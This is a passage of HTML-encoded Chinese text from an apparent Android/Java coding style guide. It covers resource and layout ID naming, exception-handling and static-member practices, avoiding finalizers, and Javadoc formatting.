12pt"><b>&#31867;&#21035;</b></font></span></font></p></td><td width="306" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21629;&#21517;</b></font></span></font></p></td><td width="203" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#31034;&#20363;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="45" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">strings</font></font></p></td><td width="306" style="border: none; padding: 0in"><p class="western" align="left" style="margin-bottom: 0in; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">strings</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">name</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21629;&#21517;&#20351;&#29992;&#19979;&#21010;&#32447;&#21629;&#21517;&#27861;&#65292;&#37319;&#29992;&#20197;&#19979;&#35268;&#21017;&#65306;</font></span></font></p><p align="left" style="margin-top: 0.19in; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27169;&#22359;&#21517;</span></font></font><font size="3" style="font-size: 12pt">+</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36923;&#36753;&#21517;&#31216;</span></font></font></p></td><td width="203" style="border: none; padding: 0in"><p class="western" align="left" style="margin-bottom: 0in; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">main_menu_about</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20027;&#33756;&#21333;&#25353;&#38190;&#25991;&#23383;</font></span></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">friend_title </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22909;&#21451;&#27169;&#22359;&#26631;&#39064;&#26639;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">friend_dialog_del </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22909;&#21451;&#21024;&#38500;&#25552;&#31034;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">login_check_email </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30331;&#24405;&#39564;&#35777;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">dialog_title </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24377;&#20986;&#26694;&#26631;&#39064;</span></font></font></p><p align="left" style="margin-top: 0.19in; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">button_ok </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30830;&#35748;&#38190;</span></font></font><font size="3" style="font-size: 12pt">loading</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21152;&#36733;&#25991;&#23383;</span></font></font></p></td></tr><tr><td width="45" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">colors</font></font></p></td><td width="306" style="border: none; padding: 0in"><p class="western" align="left" style="margin-bottom: 0in; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">colors</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">name</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21629;&#21517;&#20351;&#29992;&#19979;&#21010;&#32447;&#21629;&#21517;&#27861;&#65292;&#37319;&#29992;&#20197;&#19979;&#35268;&#21017;&#65306;</font></span></font></p><p align="left" style="margin-top: 0.19in; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27169;&#22359;&#21517;</span></font></font><font size="3" style="font-size: 12pt">+</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36923;&#36753;&#21517;&#31216;&#39068;&#33394;</span></font></font></p></td><td width="203" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">friend_info_bgfriend_bg transparent gray</font></font></p></td></tr><tr><td width="45" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">styles</font></font></p></td><td width="306" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">styles</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">name</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21629;&#21517;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Camel</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21629;&#21517;&#27861;&#65292;&#37319;&#29992;&#20197;&#19979;&#35268;&#21017;&#65306;&#27169;&#22359;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">+</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36923;&#36753;&#21517;&#31216;</font></span></font></p></td><td width="203" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">main_tabBottom</font></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><em>5.layout</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#20013;&#30340;</em></span></font></font><font size="3" style="font-size: 12pt"><em>id</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#21629;&#21517;</em></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21629;&#21517;&#27169;&#24335;&#20026;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">view</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#32553;&#20889;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_view</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#30340;&#36923;&#36753;&#21517;&#31216;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">AndroidStudio</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#25554;&#20214;</span></font></font><font size="3" style="font-size: 12pt">ButterKnifeZelezny</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#29983;&#25104;&#27880;&#35299;&#38750;&#24120;&#26041;&#20415;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#19981;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">ButterKnifeZelezny</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21017;&#24314;&#35758;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">view</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32553;&#20889;&#20570;&#21518;&#32512;&#65292;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">username_tv</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;&#23637;&#31034;&#29992;&#25143;&#21517;&#30340;</span></font></font><font size="3" style="font-size: 12pt">TextView</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65289;</span></font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc687194051"></a>6. <font face="&#23435;&#20307;"><span lang="zh-CN">&#32534;&#31243;&#23454;&#36341;</span></font></h1><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1366589618"></a>6.1 @Override<font face="&#23435;&#20307;"><span lang="zh-CN">&#65306;&#33021;&#29992;&#21017;&#29992;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21482;&#35201;&#26159;&#21512;&#27861;&#30340;&#65292;&#23601;&#25226;</span></font></font><font size="3" style="font-size: 12pt">@Override</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#35299;&#32473;&#29992;&#19978;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc251029183"></a>6.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25429;&#33719;&#30340;&#24322;&#24120;&#65306;&#19981;&#33021;&#24573;&#35270;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38500;&#20102;&#19979;&#38754;&#30340;&#20363;&#23376;&#65292;&#23545;&#25429;&#33719;&#30340;&#24322;&#24120;&#19981;&#20570;&#21709;&#24212;&#26159;&#26497;&#23569;&#27491;&#30830;&#30340;&#12290;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20856;&#22411;&#30340;&#21709;&#24212;&#26041;&#24335;&#26159;&#25171;&#21360;&#26085;&#24535;&#65292;&#25110;&#32773;&#22914;&#26524;&#23427;&#34987;&#35748;&#20026;&#26159;&#19981;&#21487;&#33021;&#30340;&#65292;&#21017;&#25226;&#23427;&#24403;&#20316;&#19968;&#20010;</span></font></font><font size="3" style="font-size: 12pt">AssertionError</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#37325;&#26032;&#25243;&#20986;&#12290;</span></font></font><font size="3" style="font-size: 12pt">)<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#23427;&#30830;&#23454;&#26159;&#19981;&#38656;&#35201;&#22312;</span></font></font><font size="3" style="font-size: 12pt">catch</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#20013;&#20570;&#20219;&#20309;&#21709;&#24212;&#65292;&#38656;&#35201;&#20570;&#27880;&#37322;&#21152;&#20197;&#35828;&#26126;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#19979;&#38754;&#30340;&#20363;&#23376;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">try<font face="Courier New, serif"><font size="2" style="font-size: 10pt">{_x000D_    </font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">i = Integer.parseInt(response);_x000D_    </font></font>return<font face="Courier New, serif"><font size="2" style="font-size: 10pt">handleNumericResponse();_x000D_} </font></font>catch<font face="Courier New, serif"><font size="2" style="font-size: 10pt">(NumberFormatException ok) {_x000D_    </font></font>// it's notnumeric; that's fine, just continue<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_}</font></font>return<font face="Courier New, serif"><font size="2" style="font-size: 10pt">handleTextResponse(response);</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22806;&#65306;&#22312;&#27979;&#35797;&#20013;&#65292;&#22914;&#26524;&#19968;&#20010;&#25429;&#33719;&#30340;&#24322;&#24120;&#34987;&#21629;&#21517;&#20026;</span></font></font><font size="3" style="font-size: 12pt">expected</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21017;&#23427;&#21487;&#20197;&#34987;&#19981;&#21152;&#27880;&#37322;&#22320;&#24573;&#30053;&#12290;&#19979;&#38754;&#26159;&#19968;&#31181;&#38750;&#24120;&#24120;&#35265;&#30340;&#24773;&#24418;&#65292;&#29992;&#20197;&#30830;&#20445;&#25152;&#27979;&#35797;&#30340;&#26041;&#27861;&#20250;&#25243;&#20986;&#19968;&#20010;&#26399;&#26395;&#20013;&#30340;&#24322;&#24120;&#65292;&#22240;&#27492;&#22312;&#36825;&#37324;&#23601;&#27809;&#26377;&#24517;&#35201;&#21152;&#27880;&#37322;&#12290;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">try<font face="Courier New, serif"><font size="2" style="font-size: 10pt">{_x000D_    emptyStack.pop();_x000D_    fail();_x000D_} </font></font>catch<font face="Courier New, serif"><font size="2" style="font-size: 10pt">(NoSuchElementException expected) {_x000D_}</font></font></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1883246375"></a>6.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38745;&#24577;&#25104;&#21592;&#65306;&#20351;&#29992;&#31867;&#36827;&#34892;&#35843;&#29992;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20351;&#29992;&#31867;&#21517;&#35843;&#29992;&#38745;&#24577;&#30340;&#31867;&#25104;&#21592;&#65292;&#32780;&#19981;&#26159;&#20855;&#20307;&#26576;&#20010;&#23545;&#35937;&#25110;&#34920;&#36798;&#24335;&#12290;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">FooaFoo = ...;_x000D_Foo.aStaticMethod(); </font></font>//good<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_aFoo.aStaticMethod();</font></font>// bad<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_somethingThatYieldsAFoo().aStaticMethod();</font></font>// very bad</font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1420039921"></a>6.4 Finalizers: <font face="&#23435;&#20307;"><span lang="zh-CN">&#31105;&#29992;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26497;&#23569;&#20250;&#21435;&#37325;&#36733;</span></font></font><font size="3" style="font-size: 12pt">Object.finalize</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19981;&#35201;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">finalize</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#22914;&#26524;&#20320;&#38750;&#35201;&#20351;&#29992;&#23427;&#65292;&#35831;&#20808;&#20180;&#32454;&#38405;&#35835;&#21644;&#29702;&#35299;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">EffectiveJava </font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31532;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">7</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26465;&#27454;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">&quot;AvoidFinalizers&quot;</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#28982;&#21518;&#19981;&#35201;&#20351;&#29992;&#23427;&#12290;</span></font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc747006748"></a>7. Javadoc</h1><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1929682938"></a>7.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26684;&#24335;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc229906133"></a>7.1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#33324;&#24418;&#24335;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#30340;&#22522;&#26412;&#26684;&#24335;&#22914;&#19979;&#25152;&#31034;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">/**</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">  <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">*Multiple lines of Javadoc text are written here,</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2">  <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">*wrapped normally...</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">*/</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">publicint method(String p1) <font face="Courier New, serif"><font size="2" style="font-size: 10pt">{... }</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;&#32773;&#26159;&#20197;&#19979;&#21333;&#34892;&#24418;&#24335;&#65306;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">/**An especially short bit of Javadoc. */</font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22522;&#26412;&#26684;&#24335;&#24635;&#26159;</span></font></font><font size="3" style="font-size: 12pt">OK</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#12290;&#24403;&#25972;&#20010;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22359;&#33021;&#23481;&#32435;&#20110;&#19968;&#34892;&#26102;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19988;&#27809;&#26377;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#35760;</span></font></font><font size="3" style="font-size: 12pt">@XXX)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21487;&#20197;&#20351;&#29992;&#21333;&#34892;&#24418;&#24335;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc443955475"></a>7.1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#27573;&#33853;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31354;&#34892;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;&#65292;&#21482;&#21253;&#21547;&#26368;&#24038;&#20391;&#26143;&#21495;&#30340;&#34892;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20250;&#20986;&#29616;&#22312;&#27573;&#33853;&#20043;&#38388;&#21644;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#35760;</span></font></font><font size="3" style="font-size: 12pt">(@XXX)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20043;&#21069;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#26377;&#30340;&#35805;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38500;&#20102;&#31532;&#19968;&#20010;&#27573;&#33853;&#65292;&#27599;&#20010;&#27573;&#33853;&#31532;&#19968;&#20010;&#21333;&#35789;&#21069;&#37117;&#26377;&#26631;&#31614;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">&lt;p&gt;</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#24182;&#19988;&#23427;&#21644;&#31532;&#19968;&#20010;&#21333;&#35789;&#38388;&#27809;&#26377;&#31354;&#26684;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc257029093"></a>7.1.3 Javadoc<font face="&#23435;&#20307;"><span lang="zh-CN">&#26631;&#35760;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#20934;&#30340;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#35760;&#25353;&#20197;&#19979;&#39034;&#24207;&#20986;&#29616;&#65306;</span></font></font><font size="3" style="font-size: 12pt">@param,@return, @throws, @deprecated,<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21069;&#38754;&#36825;</span></font></font><font size="3" style="font-size: 12pt">4</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31181;&#26631;&#35760;&#22914;&#26524;&#20986;&#29616;&#65292;&#25551;&#36848;&#37117;&#19981;&#33021;&#20026;&#31354;&#12290;&#24403;&#25551;&#36848;&#26080;&#27861;&#22312;&#19968;&#34892;&#20013;&#23481;&#32435;&#65292;&#36830;&#32493;&#34892;&#38656;&#35201;&#33267;&#23569;&#20877;&#32553;&#36827;</span></font></font><font size="3" style="font-size: 12pt">4</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20010;&#31354;&#26684;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc2102161504"></a>7.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#25688;&#35201;&#29255;&#27573;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;&#31867;&#25110;&#25104;&#21592;&#30340;</span></font></font><font size="3" style="font-size: 12pt">Javadoc</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20197;&#19968;&#20010;&#31616;&#30701;&#30340;&#25688;&#35201;&#29255;&#27573;&#24320;&#22987;&#12290;&#36825;&#20010;&#29255;&#27573;&#26159;&#38750;&#24120;&#37325;&#35201;&#30340;&#65292;&#22312;&#26576;&#20123;&#24773;&#20917;&#19979;&#65292;&#23427;&#26159;&#21807;&#19968;&#20986;&#29616;&#30340;&#25991;&#26412;&#65292;&#27604;&#22914;&#22312;&#31867;&#21644;&#26041;&#27861;&#32034;&#24341;&#20013;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#21482;&#26159;&#19968;&#20010;&#23567;&#29255;&#27573;&#65292;&#21487;&#20197;&#26159;&#19968;&#20010;&#21517;&#35789;&#30701;&#35821;&#25110;&#21160;&#35789;&#30701;&#35821;&#65292;&#20294;&#19981;&#26159;&#19968;&#20010;&#23436;&#25972;&#30340;&#21477;&#23376;&#12290;&#23427;&#19981;&#20250;&#20197;</span></font></font><font size="3" style="font-size: 12pt">A{@code Foo} is a...</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">Thismethod returns...</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24320;&#22836;</span></font></font><font size="3" style="font-size: 12pt">,<br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23427;&#20063;&#19981;&#20250;&#26159;&#19968;&#20010;&#23436;&#25972;&#30340;&#31048;&#20351;&#21477;&#65292;&#22914;</span></font></font><font size="3" style="font-size: 12pt">Savethe record...</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;&#28982;&#32780;&#65292;&#30001;&#20110;&#24320;&#22836;&#22823;&#20889;&#21450;&#34987;&#21152;&#20102;&#26631;&#28857;&#65292;&#23427;&#30475;&#36215;&#26469;&#23601;&#20687;&#26159;&#20010;&#23436;&#25972;&#30340;&#21477;&#23376;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#20010;&#24120;&#35265;&#30340;&#38169;&#35823;&#26159;&#25226;&#31616;&#21333;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Javadoc</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20889;&#25104;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">/**@return the customer ID */</font></font></font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 